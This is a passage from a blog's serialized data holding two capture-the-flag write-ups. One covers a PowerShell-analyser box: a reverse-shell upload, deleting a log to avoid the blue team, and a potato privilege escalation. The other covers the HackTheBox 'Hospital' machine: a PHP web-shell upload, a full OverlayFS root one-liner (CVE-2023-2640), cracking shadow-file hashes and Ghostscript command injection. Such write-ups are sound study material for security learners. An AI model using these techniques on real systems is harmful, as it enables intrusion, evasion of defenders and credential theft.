httpd <span class=\"number\">2.4</span>.<span class=\"number\">56</span> ((Win64) OpenSSL/<span class=\"number\">1.1</span>.<span class=\"number\">1</span>t PHP/<span class=\"number\">8.0</span>.<span class=\"number\">28</span>)</span><br><span class=\"line\">|_http-server-header: Apache/<span class=\"number\">2.4</span>.<span class=\"number\">56</span> (Win64) OpenSSL/<span class=\"number\">1.1</span>.<span class=\"number\">1</span>t PHP/<span class=\"number\">8.0</span>.<span class=\"number\">28</span></span><br><span class=\"line\">|_ssl-date: TLS randomness does not represent time</span><br><span class=\"line\">| ssl-cert: Subject: commonName=localhost</span><br><span class=\"line\">| Issuer: commonName=localhost</span><br><span class=\"line\">| Public Key type: rsa</span><br><span class=\"line\">| Public Key bits: <span class=\"number\">1024</span></span><br><span class=\"line\">| Signature Algorithm: sha1WithRSAEncryption</span><br><span class=\"line\">| Not valid before: <span class=\"number\">2009</span>-<span class=\"number\">11</span>-<span class=\"number\">10</span>T23:<span class=\"number\">48</span>:<span class=\"number\">47</span></span><br><span class=\"line\">| Not valid after:  <span class=\"number\">2019</span>-<span class=\"number\">11</span>-<span class=\"number\">08</span>T23:<span class=\"number\">48</span>:<span class=\"number\">47</span></span><br><span class=\"line\">| MD5:   a0a4:<span class=\"number\">4</span>cc9:<span class=\"number\">9</span>e84:b26f:<span class=\"number\">9</span>e63:<span class=\"number\">9</span>f9e:d229:dee0</span><br><span class=\"line\">| SHA-<span class=\"number\">1</span>: b023:<span class=\"number\">8</span>c54:<span class=\"number\">7</span>a90:<span class=\"number\">5</span>bfa:<span class=\"number\">119</span>c:<span class=\"number\">4</span>e8b:acca:eacf:<span class=\"number\">3649</span>:<span class=\"number\">1</span>ff6</span><br><span class=\"line\">| -----BEGIN CERTIFICATE-----</span><br><span class=\"line\">| MIIBnzCCAQgCCQC1x1LJh4G1AzANBgkqhkiG9w0BAQUFADAUMRIwEAYDVQQDEwls</span><br><span class=\"line\">| b2NhbGhvc3QwHhcNMDkxMTEwMjM0ODQ3WhcNMTkxMTA4MjM0ODQ3WjAUMRIwEAYD</span><br><span class=\"line\">| VQQDEwlsb2NhbGhvc3QwgZ8wDQYJKoZIhvcNAQEBBQADgY0AMIGJAoGBAMEl0yfj</span><br><span class=\"line\">| <span class=\"number\">7</span>K0Ng2pt51+adRAj4pCdoGOVjx1BmljVnGOMW3OGkHnMw9ajibh1vB6UfHxu463o</span><br><span class=\"line\">| J1wLxgxq+Q8y/rPEehAjBCspKNSq+bMvZhD4p8HNYMRrKFfjZzv3ns1IItw46kgT</span><br><span class=\"line\">| gDpAl1cMRzVGPXFimu5TnWMOZ3ooyaQ0/xntAgMBAAEwDQYJKoZIhvcNAQEFBQAD</span><br><span class=\"line\">| gYEAavHzSWz5umhfb/MnBMa5DL2VNzS+<span class=\"number\">9</span>whmmpsDGEG+uR0kM1W2GQIdVHHJTyFd</span><br><span class=\"line\">| aHXzgVJBQcWTwhp84nvHSiQTDBSaT6cQNQpvag/TaED/SEQpm0VqDFwpfFYuufBL</span><br><span class=\"line\">| vVNbLkKxbK2XwUvu0RxoLdBMC/<span class=\"number\">89</span>HqrZ0ppiONuQ+X2MtxE=</span><br><span class=\"line\">|_-----END CERTIFICATE-----</span><br><span class=\"line\">|_http-title: PowerShell Script Analyser</span><br><span class=\"line\">| tls-alpn: </span><br><span class=\"line\">|_  http/<span class=\"number\">1.1</span></span><br><span class=\"line\">| http-methods: </span><br><span class=\"line\">|_  Supported Methods: GET HEAD POST OPTIONS</span><br><span class=\"line\"><span class=\"number\">47001</span>/tcp open  http          syn-ack Microsoft HTTPAPI httpd <span class=\"number\">2.0</span> (SSDP/UPnP)</span><br><span class=\"line\">|_http-title: Not Found</span><br><span class=\"line\">|_http-server-header: Microsoft-HTTPAPI/<span class=\"number\">2.0</span></span><br><span class=\"line\"><span class=\"number\">49664</span>/tcp open  msrpc         syn-ack Microsoft Windows RPC</span><br><span class=\"line\"><span class=\"number\">49665</span>/tcp open  msrpc         syn-ack Microsoft Windows RPC</span><br><span class=\"line\"><span class=\"number\">49666</span>/tcp open  msrpc         syn-ack Microsoft Windows RPC</span><br><span class=\"line\"><span class=\"number\">49667</span>/tcp open  msrpc         syn-ack Microsoft Windows RPC</span><br><span class=\"line\"><span class=\"number\">49668</span>/tcp open  msrpc         syn-ack Microsoft Windows RPC</span><br><span class=\"line\"><span class=\"number\">49669</span>/tcp open  msrpc         syn-ack Microsoft Windows RPC</span><br><span class=\"line\"><span class=\"number\">49670</span>/tcp open  msrpc         syn-ack Microsoft Windows RPC</span><br><span class=\"line\">Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class=\"line\"></span><br><span class=\"line\">Host script results:</span><br><span class=\"line\">|_clock-skew: mean: <span class=\"number\">0</span>s, deviation: <span class=\"number\">0</span>s, median: -<span class=\"number\">1</span>s</span><br><span class=\"line\">| smb2-security-mode: </span><br><span class=\"line\">|   <span class=\"number\">3</span>:<span class=\"number\">1</span>:<span class=\"number\">1</span>: </span><br><span class=\"line\">|_    Message signing enabled but not required</span><br><span class=\"line\">| p2p-conficker: </span><br><span class=\"line\">|   Checking for Conficker.C or higher...</span><br><span class=\"line\">|   Check <span class=\"number\">1</span> (port <span class=\"number\">52662</span>/tcp): CLEAN (Timeout)</span><br><span class=\"line\">|   Check <span class=\"number\">2</span> (port <span class=\"number\">33712</span>/tcp): CLEAN (Timeout)</span><br><span class=\"line\">|   Check <span class=\"number\">3</span> (port <span class=\"number\">30307</span>/udp): CLEAN (Timeout)</span><br><span class=\"line\">|   Check <span class=\"number\">4</span> (port <span class=\"number\">41933</span>/udp): CLEAN (Timeout)</span><br><span class=\"line\">|_  <span class=\"number\">0</span>/<span class=\"number\">4</span> checks are positive: Host is CLEAN or ports are blocked</span><br><span class=\"line\">| smb2-time: </span><br><span class=\"line\">|   date: <span class=\"number\">2023</span>-<span class=\"number\">11</span>-<span class=\"number\">30</span>T18:<span class=\"number\">28</span>:<span class=\"number\">10</span></span><br><span class=\"line\">|_  start_date: N/A</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<h2 id=\"checking-the-site\"><a href=\"#checking-the-site\" class=\"headerlink\" title=\"checking the site\"></a>checking the site</h2><p><img src=\"https://i.imgur.com/uV5DpSl.png\"></p>\n<p>Checking the site out as described on tryhackme we are presented a site.</p>\n<p><img src=\"https://i.imgur.com/JWMZg47.png\"></p>\n<p>So on the site we are only allowed to upload powershell scripts, we need to upload a script which will give us a reverse sehll to connect to the machine.</p>\n<h2 id=\"initial-foothold\"><a href=\"#initial-foothold\" class=\"headerlink\" title=\"initial foothold\"></a>initial foothold</h2><p>Generating a reverse shell with <a href=\"http://revshells.com/\">revshells</a> and uploading it on the website we get a connection back. </p>\n<p><em>Disclaimer</em></p>\n<p>After uploading the script and using netcat as your listener you’ll get a shell connection back but without the terminal instant which is <em>‘funny’</em> to work with.<br><img src=\"https://i.imgur.com/FQKIuhp.png\"></p>\n<p>A better shell instance that i got was from this guy <a href=\"https://github.com/malw0re/scriptures-\">malw0re</a>. So after uploading we get a clean looking shell back. Searching the folders we land on the Desktop folder and there is a file called <em>encodedflag</em>.</p>\n<p>Decoding and reading the file we get some interesting message.</p>\n<p><img src=\"https://i.imgur.com/kNofE1s.png\"></p>\n<p>Following the decoded message and checking it out on the webpage we get an interesting message.<br><img src=\"https://i.imgur.com/JqHJOnC.png\"></p>\n<h2 id=\"user-level-flag\"><a href=\"#user-level-flag\" class=\"headerlink\" title=\"user level flag.\"></a>user level flag.</h2><p>Checking the documents file there is a directory called tasks inside it there’s a file called log.txt and from the webpage response we need to remove the log file not to alert the blue team, removing the log file and reloading the webpage we get nothing so got stuck for a while.<br>Then reading the <em>file.ps1</em> we see there is a directory hosting xampp</p>\n<p><img src=\"https://i.imgur.com/ZaomI08.png\"></p>\n<p>Under the uploads directory, we identify the a log file removing it and refreshing the page we get the first flag.</p>\n<p><img src=\"https://i.imgur.com/6C9PKha.png\"></p>\n<p><img src=\"https://i.imgur.com/o4vn183.png\"></p>\n<h2 id=\"root-level-flag\"><a href=\"#root-level-flag\" class=\"headerlink\" title=\"root level flag.\"></a>root level flag.</h2><p>Having the user flag we need to look out for privesc vectors on the box and since it’s a windows box i uploaded a powershell script that looks for some vectors.</p>\n<p><img src=\"https://i.imgur.com/q5dzts3.png\"></p>\n<p>The command is downloading the (win-priv-check.ps1) from my attacker ip address using using the Invoke-WebRequest cmdlet and saving it locally as win.ps1. Running the script it identifies apache is running as admin.</p>\n<p><img src=\"https://i.imgur.com/OifDB01.png\"></p>\n<p>Let’s check evader’s privileges and check if we can abuse any privileges.</p>\n<p><img src=\"https://i.imgur.com/a72wbxc.png\"></p>\n<p>so we don’t have any specific privilege that we can abuse so my next step was to upload a malicious php script to the webserver using pownyshell.</p>\n<p>checking the privileges we see it’s different from the output we go previously.</p>\n<p><img src=\"https://i.imgur.com/A9Yszsw.png\"></p>\n<p>As we can see we can abuse the <em>“SetImpersonatePrivilege”</em> any process holding this privilege can impersonate (but not create) any token for which it is able to gethandle. You can get a privileged token from a Windows service (DCOM) making it perform an NTLM authentication against the exploit, then execute a process as SYSTEM <a href=\"https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/privilege-escalation-abusing-tokens\">referenced from here.</a></p>\n<p>So our privesc vector are all relate to a potato exploit and after trying and failing i landed on the <em>“efspotato”</em> exploit which worked and elevate our privileges to NT SYSTEM!!</p>\n<p><img src=\"https://i.imgur.com/F5WGaj8.png\"></p>\n<p>Trying to get the admin flag we are face with some errors.</p>\n<p><img src=\"https://i.imgur.com/wDnF2Xy.png\"></p>\n<p>So the next step was creating a user with admin privileges then rdp into the machine and get the machine.</p>\n<p><img src=\"https://i.imgur.com/U29uu8P.png\"></p>\n<p>Login into the machine with the created user and get the flag</p>\n<p><img src=\"https://i.imgur.com/jlALEK2.png\"></p>\n<p>Hope you learnt something new ✨</p>\n"},{"title":"Hospital","date":"2023-11-20T08:30:03.000Z","draft":false,"description":"Hospital HacktheBox Writeup","top_img":"/images/cyberpunk-red.jpg","_content":"\n\n\n![](https://miro.medium.com/v2/resize:fit:720/format:webp/1*O3TMa7eQF57fH7yJWkyRkg.png)\n\n## Intro\n\nHospital. It is a Medium Category Machine. It involves some File Upload Attack, Ghostscript Command Injection and some Windows Privesc\n\n## Initial Recon\n\n```bash\nPORT     STATE SERVICE          REASON\n22/tcp   open  ssh              syn-ack ttl 62\n53/tcp   open  domain           syn-ack ttl 127\n88/tcp   open  kerberos-sec     syn-ack ttl 127\n135/tcp  open  msrpc            syn-ack ttl 127\n139/tcp  open  netbios-ssn      syn-ack ttl 127\n389/tcp  open  ldap             syn-ack ttl 127\n443/tcp  open  https            syn-ack ttl 127\n445/tcp  open  microsoft-ds     syn-ack ttl 127\n464/tcp  open  kpasswd5         syn-ack ttl 127\n593/tcp  open  http-rpc-epmap   syn-ack ttl 127\n636/tcp  open  ldapssl          syn-ack ttl 127\n1801/tcp open  msmq             syn-ack ttl 127\n2103/tcp open  zephyr-clt       syn-ack ttl 127\n2105/tcp open  eklogin          syn-ack ttl 127\n2107/tcp open  msmq-mgmt        syn-ack ttl 127\n3268/tcp open  globalcatLDAP    syn-ack ttl 127\n3269/tcp open  globalcatLDAPssl syn-ack ttl 127\n3389/tcp open  ms-wbt-server    syn-ack ttl 127\n5985/tcp open  wsman            syn-ack ttl 127\n6065/tcp open  winpharaoh       syn-ack ttl 127\n6403/tcp open  boe-cachesvr     syn-ack ttl 127\n6406/tcp open  boe-processsvr   syn-ack ttl 127\n6407/tcp open  boe-resssvr1     syn-ack ttl 127\n6409/tcp open  boe-resssvr3     syn-ack ttl 127\n6617/tcp open  unknown          syn-ack ttl 127\n6635/tcp open  mpls-udp         syn-ack ttl 127\n8080/tcp open  http-proxy       syn-ack ttl 62\n9389/tcp open  adws             syn-ack ttl 127\n\nRead data files from: /usr/bin/../share/nmap\n# Nmap done at Sun Feb 25 21:01:51 2024 -- 1 IP address (1 host up) scanned in 1537.10 seconds\n                                                                                                                    \n❯ cat Script_TCP_10.10.11.241.nmap\n# Nmap 7.94SVN scan initiated Sun Feb 25 21:01:52 2024 as: /usr/bin/nmap -Pn -sCV -p22,53,88,135,139,389,443,445,464,593,636,1801,2103,2105,2107,3268,3269,3389,5985,6065,6403,6406,6407,6409,6617,6635,8080,9389 --open -oN nmap/Script_TCP_10.10.11.241.nmap --system-dns --stats-every 2s 10.10.11.241\nNmap scan report for 10.10.11.241\nHost is up (0.48s latency).\n\nPORT     STATE SERVICE           VERSION\n22/tcp   open  ssh               OpenSSH 9.0p1 Ubuntu 1ubuntu8.5 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   256 e1:4b:4b:3a:6d:18:66:69:39:f7:aa:74:b3:16:0a:aa (ECDSA)\n|_  256 96:c1:dc:d8:97:20:95:e7:01:5f:20:a2:43:61:cb:ca (ED25519)\n53/tcp   open  domain            Simple DNS Plus\n88/tcp   open  kerberos-sec      Microsoft Windows Kerberos (server time: 2024-02-26 01:02:02Z)\n135/tcp  open  msrpc             Microsoft Windows RPC\n139/tcp  open  netbios-ssn       Microsoft Windows netbios-ssn\n389/tcp  open  ldap              Microsoft Windows Active Directory LDAP (Domain: hospital.htb0., Site: Default-First-Site-Name)\n| ssl-cert: Subject: commonName=DC\n| Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb\n| Not valid before: 2023-09-06T10:49:03\n|_Not valid after:  2028-09-06T10:49:03\n443/tcp  open  ssl/http          Apache httpd 2.4.56 ((Win64) OpenSSL/1.1.1t PHP/8.0.28)\n|_ssl-date: TLS randomness does not represent time\n|_http-title: Hospital Webmail :: Welcome to Hospital Webmail\n| ssl-cert: Subject: commonName=localhost\n| Not valid before: 2009-11-10T23:48:47\n|_Not valid after:  2019-11-08T23:48:47\n|_http-server-header: Apache/2.4.56 (Win64) OpenSSL/1.1.1t PHP/8.0.28\n| tls-alpn: \n|_  http/1.1\n445/tcp  open  microsoft-ds?\n464/tcp  open  kpasswd5?\n593/tcp  open  ncacn_http        Microsoft Windows RPC over HTTP 1.0\n636/tcp  open  ldapssl?\n| ssl-cert: Subject: commonName=DC\n| Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb\n| Not valid before: 2023-09-06T10:49:03\n|_Not valid after:  2028-09-06T10:49:03\n1801/tcp open  msmq?\n2103/tcp open  msrpc             Microsoft Windows RPC\n2105/tcp open  msrpc             Microsoft Windows RPC\n2107/tcp open  msrpc             Microsoft Windows RPC\n3268/tcp open  ldap              Microsoft Windows Active Directory LDAP (Domain: hospital.htb0., Site: Default-First-Site-Name)\n| ssl-cert: Subject: commonName=DC\n| Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb\n| Not valid before: 2023-09-06T10:49:03\n|_Not valid after:  2028-09-06T10:49:03\n3269/tcp open  globalcatLDAPssl?\n| ssl-cert: Subject: commonName=DC\n| Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb\n| Not valid before: 2023-09-06T10:49:03\n|_Not valid after:  2028-09-06T10:49:03\n3389/tcp open  ms-wbt-server     Microsoft Terminal Services\n| ssl-cert: Subject: commonName=DC.hospital.htb\n| Not valid before: 2024-02-24T17:09:39\n|_Not valid after:  2024-08-25T17:09:39\n| rdp-ntlm-info: \n|   Target_Name: HOSPITAL\n|   NetBIOS_Domain_Name: HOSPITAL\n|   NetBIOS_Computer_Name: DC\n|   DNS_Domain_Name: hospital.htb\n|   DNS_Computer_Name: DC.hospital.htb\n|   DNS_Tree_Name: hospital.htb\n|   Product_Version: 10.0.17763\n|_  System_Time: 2024-02-26T01:03:21+00:00\n5985/tcp open  http              Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n|_http-title: Not Found\n|_http-server-header: Microsoft-HTTPAPI/2.0\n6065/tcp open  msrpc             Microsoft Windows RPC\n6403/tcp open  msrpc             Microsoft Windows RPC\n6406/tcp open  msrpc             Microsoft Windows RPC\n6407/tcp open  ncacn_http        Microsoft Windows RPC over HTTP 1.0\n6409/tcp open  msrpc             Microsoft Windows RPC\n6617/tcp open  msrpc             Microsoft Windows RPC\n6635/tcp open  msrpc             Microsoft Windows RPC\n8080/tcp open  http              Apache httpd 2.4.55 ((Ubuntu))\n|_http-open-proxy: Proxy might be redirecting requests\n| http-cookie-flags: \n|   /: \n|     PHPSESSID: \n|_      httponly flag not set\n| http-title: Login\n|_Requested resource was login.php\n|_http-server-header: Apache/2.4.55 (Ubuntu)\n9389/tcp open  mc-nmf            .NET Message Framing\nService Info: Host: DC; OSs: Linux, Windows; CPE: cpe:/o:linux:linux_kernel, cpe:/o:microsoft:windows\n\nHost script results:\n|_clock-skew: mean: 6h59m59s, deviation: 0s, median: 6h59m59s\n| smb2-time: \n|   date: 2024-02-26T01:03:19\n|_  start_date: N/A\n| smb2-security-mode: \n|   3:1:1: \n|_    Message signing enabled and required\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\n\n```\n\nFollowing our nmap scans, first off we check out the websites on ports `8080` and `443`.\n\n## Web Enumeration\n\nLoading out the websites on the respective ports, on port `443` we are met with a login site same case applies to port `8080`\n\n![port 443](https://imgur.com/mG8iUuG.png)\n\n![port 8080](https://imgur.com/tG024km.png)\n\n### Fuzzing\n\nThe next step is fuzzing the websites for directories. Checking out port 8080 we identify a few directories open.\n```bash\n.hta                    [Status: 403, Size: 279, Words: 20, Lines: 10, Duration: 306ms]\n.php                    [Status: 403, Size: 279, Words: 20, Lines: 10, Duration: 306ms]\n.htaccess               [Status: 403, Size: 279, Words: 20, Lines: 10, Duration: 306ms]\n.hta.php                [Status: 403, Size: 279, Words: 20, Lines: 10, Duration: 306ms]\n                        [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 307ms]\n.htpasswd               [Status: 403, Size: 279, Words: 20, Lines: 10, Duration: 1429ms]\n.htaccess.php           [Status: 403, Size: 279, Words: 20, Lines: 10, Duration: 3359ms]\n.htpasswd.php           [Status: 403, Size: 279, Words: 20, Lines: 10, Duration: 7432ms]\nconfig.php              [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 200ms]\ncss                     [Status: 301, Size: 317, Words: 20, Lines: 10, Duration: 199ms]\nfailed.php              [Status: 200, Size: 3508, Words: 132, Lines: 83, Duration: 201ms]\nfonts                   [Status: 301, Size: 319, Words: 20, Lines: 10, Duration: 200ms]\nimages                  [Status: 301, Size: 320, Words: 20, Lines: 10, Duration: 200ms]\nindex.php               [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 204ms]\nindex.php               [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 204ms]\njs                      [Status: 301, Size: 316, Words: 20, Lines: 10, Duration: 200ms]\nlogin.php               [Status: 200, Size: 5739, Words: 1551, Lines: 134, Duration: 203ms]\nlogout.php              [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 202ms]\nregister.php            [Status: 200, Size: 5125, Words: 1349, Lines: 114, Duration: 208ms]\nserver-status           [Status: 403, Size: 279, Words: 20, Lines: 10, Duration: 206ms]\nsuccess.php             [Status: 200, Size: 3536, Words: 134, Lines: 84, Duration: 306ms]\nupload.php              [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 203ms]\nuploads                 [Status: 301, Size: 321, Words: 20, Lines: 10, Duration: 199ms]\nvendor                  [Status: 301, Size: 320, Words: 20, Lines: 10, Duration: 200ms]\n```\n\nFirst thing was to test out if we could register an account because from our fuzz output we identify that the uploads directory redirects to somewhere.\n![](https://imgur.com/sZNmuyx.png)\n\nAfter logging in we are redirected to a page where we can upload files on the webpage.\n![](https://imgur.com/ySaSfRw.png)\n\nLook at this instantly we need to try out some file upload attacks and since we have the [resources](https://book.hacktricks.xyz/pentesting-web/file-upload?source=post_page-----791ad6dd24ed--------------------------------) to do so. We see that we can that we can upload a `.phar` file instead of a php file which subsequently involves getting a shell through accessing the uploads file. \n\nFrom my research i opted to go with [powny](https://github.com/flozz/p0wny-shell) a very basic, single-file, PHP shell. After changing the extension to `phar` extension, we get a successful upload response.\nFrom our fuzzing earlier we saw an `/uploads` which can basically access files that we've uploaded, which triggers a shell on the box.\n\n![](https://imgur.com/Zc1hBoJ.png)\n\n\n## Initial Access.\nHaving landed on the box, the powny shell instance was super slow for me so i decided to work from my environment and spawn back an instance on my machine using [pwncat](https://github.com/calebstewart/pwncat). Where we get an active session.\n![](https://imgur.com/1CxIELr.png)\n\n### Enumeration.\n\nRunning some enumeration using pwncat in built script we identify a few interesting bits of information, first of we have the systems version number.\n![](https://imgur.com/ETUmbkq.png)\n\n\n![](https://imgur.com/JRWLY6J.png)\n\nA username called `drwilliams` trying to access his folder we are given permission denied as we are `www-data` and can't access content inside his folder due to insufficient permissions.\n\n![](https://imgur.com/kipG9XY.png)\n\n\n## Privesc \n\nChecking for vulnerabilities pertaining the system version we land on `CVE-2023–2640` a vulnerability that affects the Ubuntu kernel’s OverlayFS module.\n\nFirst off we need to identify if our system is running overlay.\n\n![](https://imgur.com/v18baZ9.png) \n\nand we see its running overlay to exploit this there's a public [POC](https://github.com/g1vi/CVE-2023-2640-CVE-2023-32629)\n\n```bash\nunshare -rm sh -c \"mkdir l u w m && cp /u*/b*/p*3 l/;setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*; python3 -c 'import os;os.setuid(0);os.system(\\\"/bin/bash\\\")'\"\n```\n\nwhich when executed gives us some higher privileges on the account, so basically what the bash script does is exploits the vulnerabilities CVE-2023-2640 and CVE-2023-3262 on a Ubuntu system to gain unauthorized root access. The script creates directories, copies specific Python3-related files with added capabilities, and mounts an overlay filesystem using these directories. This overlay allows the script to create a merged view of the filesystem, facilitating privilege escalation. By executing a modified Python3 script within this overlay, the user ID is set to root, and the script copies and elevates the system Bash binary, allowing execution with elevated privileges. The script concludes by cleaning up the directories and copied binaries. Notably, such activities are malicious, potentially illegal, and underscore the importance of understanding overlay filesystems, capability exploitation, and security vulnerabilities for defending against unauthorized access and maintaining system integrity.\n\nRunning the `POC` we get some root access.\n![](https://imgur.com/QnESbaR.png)\n\nNow having some privesc done,we can read the shadow file to see if we can extract and crack some exposed passwords saved on the system and luckyily we have a stored hash that we can crack and get `drwilliams`'s hash.Cracking the hash we get the password.\n\n![](https://imgur.com/Aa2jFb3l.png)\n\nwhich when trying out at port 443 of the website, we get access to the mail portal and checking the email we get an interesting email sent to `drwilliams` concerning a vulnerability on ghostscript. The exploitation can occur upon opening a PS or EPS file and can allow code execution caused by Ghostscript mishandling permission validation for pipe devices [poc](https://github.com/jakabakos/CVE-2023-36664-Ghostscript-command-injection)\n\n![](https://imgur.com/FLksOng.png)\n\nAfter reading the POC readme and following it through the exploitation occurs upon opening a PS or EPS file and can allow code execution cause by GhostScript mishandling permission validation for pipe devices, to delve deep check out [vsosciety_](https://www.vicarius.io/vsociety/posts/cve-2023-36664-command-injection-with-ghostscript)\n\n![](https://imgur.com/zJ8a8Gg.png)\n\n## Windows Foothold.\n\nAfter sending the payload, we receive a connection back.\n\n![](https://imgur.com/kra6hpU.png)\n\n![](https://imgur.com/oNcq1q2.png)\n\nNavigating to the `/Desktop` directory we get the user flag.\n\n![](https://imgur.com/oNcq1q2.png)\n\nFurther checking the `bat` file on the Documents directory we identify that there is an embedded password on the bat file.\n\n![](https://imgur.com/dKv1o8q.png)\n\n## Enumerating RPCCLIENT\nHaving the credentials and the information from our scans, `RPC` is open, trying out the creds we got on the bat file, we get access.\n\n## ROOT Foothold\n![](https://imgur.com/3G18Iz7.png)\n\nGoing back to the windows shell instance and enumerating further on the root directory there's a `xampp` directory which has `htdocs` where all the programs for the web pages will be stored.\n\n![](https://imgur.com/30Z8nOy.png)\n\nNotably, we can see there's a `shell.php` laying around. I replace the Content with that PHP Powny Shell.\nYou will get a Shell as Administrator and finally the Root Flag.\n\n![](https://imgur.com/TXTDJdT.png)\n\nChecking out pownyshell we get `system` access. \n\n![](https://imgur.com/u0zg5rf.png)","source":"_posts/htb/Hospital/hospital-notes.md","raw":"---\ntitle: \"Hospital\"\ndate: 2023-11-20T11:30:03+00:00\ndraft: false\ntags: [\"htb\", \"Windows\"]\ndescription: \"Hospital HacktheBox Writeup\"\ntop_img: /images/cyberpunk-red.jpg\n---\n\n\n\n![](https://miro.medium.com/v2/resize:fit:720/format:webp/1*O3TMa7eQF57fH7yJWkyRkg.png)\n\n## Intro\n\nHospital. It is a Medium Category Machine. It involves some File Upload Attack, Ghostscript Command Injection and some Windows Privesc\n\n## Initial Recon\n\n```bash\nPORT     STATE SERVICE          REASON\n22/tcp   open  ssh              syn-ack ttl 62\n53/tcp   open  domain           syn-ack ttl 127\n88/tcp   open  kerberos-sec     syn-ack ttl 127\n135/tcp  open  msrpc            syn-ack ttl 127\n139/tcp  open  netbios-ssn      syn-ack ttl 127\n389/tcp  open  ldap             syn-ack ttl 127\n443/tcp  open  https            syn-ack ttl 127\n445/tcp  open  microsoft-ds     syn-ack ttl 127\n464/tcp  open  kpasswd5         syn-ack ttl 127\n593/tcp  open  http-rpc-epmap   syn-ack ttl 127\n636/tcp  open  ldapssl          syn-ack ttl 127\n1801/tcp open  msmq             syn-ack ttl 127\n2103/tcp open  zephyr-clt       syn-ack ttl 127\n2105/tcp open  eklogin          syn-ack ttl 127\n2107/tcp open  msmq-mgmt        syn-ack ttl 127\n3268/tcp open  globalcatLDAP    syn-ack ttl 127\n3269/tcp open  globalcatLDAPssl syn-ack ttl 127\n3389/tcp open  ms-wbt-server    syn-ack ttl 127\n5985/tcp open  wsman            syn-ack ttl 127\n6065/tcp open  winpharaoh       syn-ack ttl 127\n6403/tcp open  boe-cachesvr     syn-ack ttl 127\n6406/tcp open  boe-processsvr   syn-ack ttl 127\n6407/tcp open  boe-resssvr1     syn-ack ttl 127\n6409/tcp open  boe-resssvr3     syn-ack ttl 127\n6617/tcp open  unknown          syn-ack ttl 127\n6635/tcp open  mpls-udp         syn-ack ttl 127\n8080/tcp open  http-proxy       syn-ack ttl 62\n9389/tcp open  adws             syn-ack ttl 127\n\nRead data files from: /usr/bin/../share/nmap\n# Nmap done at Sun Feb 25 21:01:51 2024 -- 1 IP address (1 host up) scanned in 1537.10 seconds\n                                                                                                                    \n❯ cat Script_TCP_10.10.11.241.nmap\n# Nmap 7.94SVN scan initiated Sun Feb 25 21:01:52 2024 as: /usr/bin/nmap -Pn -sCV -p22,53,88,135,139,389,443,445,464,593,636,1801,2103,2105,2107,3268,3269,3389,5985,6065,6403,6406,6407,6409,6617,6635,8080,9389 --open -oN nmap/Script_TCP_10.10.11.241.nmap --system-dns --stats-every 2s 10.10.11.241\nNmap scan report for 10.10.11.241\nHost is up (0.48s latency).\n\nPORT     STATE SERVICE           VERSION\n22/tcp   open  ssh               OpenSSH 9.0p1 Ubuntu 1ubuntu8.5 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   256 e1:4b:4b:3a:6d:18:66:69:39:f7:aa:74:b3:16:0a:aa (ECDSA)\n|_  256 96:c1:dc:d8:97:20:95:e7:01:5f:20:a2:43:61:cb:ca (ED25519)\n53/tcp   open  domain            Simple DNS Plus\n88/tcp   open  kerberos-sec      Microsoft Windows Kerberos (server time: 2024-02-26 01:02:02Z)\n135/tcp  open  msrpc             Microsoft Windows RPC\n139/tcp  open  netbios-ssn       Microsoft Windows netbios-ssn\n389/tcp  open  ldap              Microsoft Windows Active Directory LDAP (Domain: hospital.htb0., Site: Default-First-Site-Name)\n| ssl-cert: Subject: commonName=DC\n| Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb\n| Not valid before: 2023-09-06T10:49:03\n|_Not valid after:  2028-09-06T10:49:03\n443/tcp  open  ssl/http          Apache httpd 2.4.56 ((Win64) OpenSSL/1.1.1t PHP/8.0.28)\n|_ssl-date: TLS randomness does not represent time\n|_http-title: Hospital Webmail :: Welcome to Hospital Webmail\n| ssl-cert: Subject: commonName=localhost\n| Not valid before: 2009-11-10T23:48:47\n|_Not valid after:  2019-11-08T23:48:47\n|_http-server-header: Apache/2.4.56 (Win64) OpenSSL/1.1.1t PHP/8.0.28\n| tls-alpn: \n|_  http/1.1\n445/tcp  open  microsoft-ds?\n464/tcp  open  kpasswd5?\n593/tcp  open  ncacn_http        Microsoft Windows RPC over HTTP 1.0\n636/tcp  open  ldapssl?\n| ssl-cert: Subject: commonName=DC\n| Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb\n| Not valid before: 2023-09-06T10:49:03\n|_Not valid after:  2028-09-06T10:49:03\n1801/tcp open  msmq?\n2103/tcp open  msrpc             Microsoft Windows RPC\n2105/tcp open  msrpc             Microsoft Windows RPC\n2107/tcp open  msrpc             Microsoft Windows RPC\n3268/tcp open  ldap              Microsoft Windows Active Directory LDAP (Domain: hospital.htb0., Site: Default-First-Site-Name)\n| ssl-cert: Subject: commonName=DC\n| Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb\n| Not valid before: 2023-09-06T10:49:03\n|_Not valid after:  2028-09-06T10:49:03\n3269/tcp open  globalcatLDAPssl?\n| ssl-cert: Subject: commonName=DC\n| Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb\n| Not valid before: 2023-09-06T10:49:03\n|_Not valid after:  2028-09-06T10:49:03\n3389/tcp open  ms-wbt-server     Microsoft Terminal Services\n| ssl-cert: Subject: commonName=DC.hospital.htb\n| Not valid before: 2024-02-24T17:09:39\n|_Not valid after:  2024-08-25T17:09:39\n| rdp-ntlm-info: \n|   Target_Name: HOSPITAL\n|   NetBIOS_Domain_Name: HOSPITAL\n|   NetBIOS_Computer_Name: DC\n|   DNS_Domain_Name: hospital.htb\n|   DNS_Computer_Name: DC.hospital.htb\n|   DNS_Tree_Name: hospital.htb\n|  